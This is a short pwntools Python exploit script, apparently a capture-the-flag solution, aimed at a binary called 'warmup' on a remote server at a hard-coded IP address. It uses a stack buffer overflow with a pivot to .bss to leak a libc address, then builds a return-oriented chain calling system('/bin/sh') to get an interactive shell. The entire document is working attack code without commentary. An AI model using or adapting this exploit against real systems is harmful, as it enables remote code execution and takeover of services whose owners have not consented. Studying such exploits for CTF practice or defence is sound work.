from pwn import *

e = ELF('./warmup')
#p = process(e.path, env={'LD_PRELOAD':'/lib/x86_64-linux-gnu/libc-2.27.so'})

p = remote('141.164.48.191', 10001)
ret = 0x0040057d
vuln = 0x0040053D

pay = 'A'*0x30 + p64(e.bss() + 8) + p64(0x40055D)
pay += 'B'*0x30 + p64(e.bss() + 8) + p64(0x40055D)
pay += 'A'*0x38 + p64(vuln)

p.sendafter('> ', pay)
p.sendafter('A'*0x38, 'ipwn')
libc = u64(p.sendafter('\x7f', 'ipwn')[-6:] + '\x00\x00') - 0x3eba00
binsh = libc + 0x1b3e1a
prdi = libc + 0x00164e7b
system = libc + 0x4f550
log.info('[GLIBC] %#x'%libc)

pay = 'A'*0x38 + p64(ret) + p64(prdi) + p64(binsh) + p64(system)
pay = pay.ljust(0xc0, '\x00')

p.sendafter('> ', pay)

p.interactive()